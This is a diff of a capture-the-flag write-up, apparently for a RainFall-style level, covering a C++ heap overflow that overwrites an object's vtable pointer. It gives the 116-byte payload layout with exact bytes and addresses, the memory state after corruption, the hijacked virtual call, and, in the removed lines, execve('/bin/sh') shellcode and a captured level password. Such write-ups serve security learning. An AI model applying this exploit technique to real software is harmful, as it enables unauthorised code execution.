@@ -206,149 +206,57 @@ call edx            ; Call function
 
 ## 🔄 Complete Execution Flow
 
-### Step-by-Step Breakdown
+### Byte-by-Byte Payload Breakdown
 
-**1. Program Initialization:**
-```cpp
-int main(int argc, char **argv)
-{
-    N *obj1 = new N(5);  // Allocates 108 bytes at 0x804a008
-    N *obj2 = new N(6);  // Allocates 108 bytes at 0x804a078
+| Offset | Size | Content | Purpose |
+|--------|------|---------|---------|
+| 0-23 | 24 bytes | Shellcode | execve("/bin/sh") code at 0x804a00c |
+| 24-107 | 84 bytes | `\x90` (NOP) | Padding to reach obj2 |
+| 108-111 | 4 bytes | `\x7c\xa0\x04\x08` | Overwrite obj2 vtable → 0x804a07c |
+| 112-115 | 4 bytes | `\x0c\xa0\x04\x08` | Write to 0x804a07c (fake vtable entry) |
+
+**Total: 116 bytes**
+
+### Memory State After Overflow
+
+```
+Heap Layout:
+
+0x804a008: obj1 vtable  → 0x08048848 (unchanged)
+0x804a00c: obj1 buffer  → [shellcode (24 bytes)][NOPs (84 bytes)]...
+           │              └─ Overflow continues ─────────────────┐
+           │                                                     │
+0x804a078: obj2 vtable  → 0x0804a07c ← CORRUPTED! Points to ────┤
+0x804a07c: obj2 buffer  → 0x0804a00c ← Fake vtable with shellcode addr
 ```
 
-**Heap state after allocation:**
-```
-0x804a008: obj1 [vtable ptr: 0x08048848][annotation: empty...][value: 5]
-0x804a078: obj2 [vtable ptr: 0x08048848][annotation: empty...][value: 6]
-```
+### Virtual Call Execution
 
----
+When `obj2->operator+()` is called:
 
-**2. Exploit Payload Delivered:**
-```cpp
-obj1->setAnnotation(argv[1]);  // Copies 116 bytes from argv[1]
-```
-
-**Payload breakdown:**
-```
-argv[1] = [shellcode (24)] + [NOPs (84)] + [fake vtable ptr (4)] + [shellcode addr (4)]
-          └── 0-23 ──────┘   └─ 24-107 ──┘   └──── 108-111 ────┘   └──── 112-115 ───┘
-```
-
-**What setAnnotation() does:**
-```cpp
-void N::setAnnotation(char *str)
-{
-    memcpy(this->annotation, str, strlen(str));
-    // Copies to 0x804a00c (obj1+4)
-    // strlen() counts until '\0', so 116 bytes total
-}
-```
-
----
-
-**3. Memory Corruption:**
-
-**After memcpy completes:**
-```
-0x804a008: obj1 vtable ptr → 0x08048848 (unchanged)
-0x804a00c: obj1 annotation → [shellcode][NOPs][continues into obj2...]
-           │
-           └─ Overflows beyond 100-byte buffer!
-
-0x804a078: obj2 vtable ptr → 0x0804a07c (CORRUPTED! was 0x08048848)
-           │                   └─ Now points to obj2's own annotation buffer
-           │
-0x804a07c: obj2 annotation → 0x0804a00c (shellcode address written here)
-           └─ This is our FAKE VTABLE containing one entry: shellcode address
-```
-
-**Memory visualization:**
-```
-obj1 region (0x804a008 - 0x804a073):
-  +0x00: [08 48 84 08]                     ← vtable ptr (unchanged)
-  +0x04: [31 c0 99 50 68 2f 2f 73 68...]  ← shellcode starts here (0x804a00c)
-  +0x1c: [90 90 90 90 90 90 90 90 90...]  ← NOPs fill to offset 108
-  ...continuing through obj1 boundary...
-
-obj2 region (0x804a078 - 0x804a0e3):
-  +0x00: [7c a0 04 08]                     ← vtable ptr OVERWRITTEN! → 0x804a07c
-  +0x04: [0c a0 04 08]                     ← annotation buffer = shellcode address
-```
-
----
-
-**4. Virtual Function Call:**
-```cpp
-obj2->operator+(*obj1);  // Triggers virtual function call
-```
-
-**Assembly execution (critical part):**
 ```asm
-; Load obj2 pointer into eax
-mov eax, [ebp-0xc]           ; eax = 0x804a078 (obj2 address)
-
-; Load vtable pointer from obj2
-mov edx, [eax]               ; edx = *(0x804a078) = 0x0804a07c (FAKE VTABLE!)
-                             ; Should be 0x08048848, but we corrupted it
-
-; Load function pointer from vtable[0]
-mov edx, [edx]               ; edx = *(0x0804a07c) = 0x0804a00c (SHELLCODE!)
-                             ; Reading from obj2's annotation buffer
-
-; Call the function
-call edx                     ; JUMP TO 0x0804a00c → SHELLCODE EXECUTES!
+mov eax, [obj2]        ; Load obj2 address → 0x804a078
+mov edx, [eax]         ; Load vtable pointer → 0x0804a07c (FAKE!)
+mov edx, [edx]         ; Load function pointer → 0x0804a00c (SHELLCODE!)
+call edx               ; Execute shellcode → /bin/sh
 ```
 
----
-
-**5. Shellcode Execution:**
-
-**CPU jumps to 0x804a00c:**
-```asm
-; Shellcode executes: execve("/bin/sh", NULL, NULL)
-0x804a00c: xor    eax, eax         ; eax = 0
-0x804a00e: cdq                     ; edx = 0
-0x804a00f: push   eax              ; NULL terminator
-0x804a010: push   0x68732f2f       ; "//sh"
-0x804a015: push   0x6e69622f       ; "/bin"
-0x804a01a: mov    ebx, esp         ; ebx → "/bin//sh"
-0x804a01c: push   eax              ; NULL (argv[1])
-0x804a01d: push   ebx              ; "/bin//sh" (argv[0])
-0x804a01e: mov    ecx, esp         ; ecx → argv
-0x804a020: mov    al, 0xb          ; eax = 11 (sys_execve)
-0x804a022: int    0x80             ; System call!
+**Double indirection:**
+```
+obj2 (0x804a078) → fake vtable (0x804a07c) → shellcode (0x804a00c)
 ```
 
----
-
-**6. Shell Spawned:**
-```bash
-$ whoami
-bonus0
-$ cat /home/user/bonus0/.pass
-f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
-```
-
----
-
-### Key Insight: The Double Indirection
-
-**Why we can't just overwrite vtable pointer to shellcode address:**
+### Why Double Indirection is Required
 
 ```
-❌ Wrong approach:
-obj2 vtable ptr → 0x0804a00c (shellcode)
-Virtual call: mov edx, [0x0804a00c]  ← Reads FROM shellcode bytes (garbage!)
-            call edx                ← Jumps to garbage address → CRASH
+❌ Wrong: obj2 vtable → 0x0804a00c (shellcode)
+   Problem: CPU reads FROM shellcode bytes as if they were a vtable → garbage address
 
-✅ Correct approach:
-obj2 vtable ptr → 0x0804a07c (fake vtable in obj2's annotation)
-Virtual call: mov edx, [0x0804a07c]  ← Reads shellcode address: 0x0804a00c
-            call edx                ← Jumps to shellcode → SUCCESS
+✅ Correct: obj2 vtable → 0x0804a07c (fake vtable containing shellcode address)
+   Success: CPU reads shellcode address from fake vtable → jumps to shellcode
 ```
 
-The vtable is a **table of function pointers**, not a function itself. The CPU reads an address FROM the vtable, then calls that address. We must provide a fake table with our shellcode address in it.
+The vtable must point to a **table of addresses**, not directly to code.
 
 ### Shellcode
 
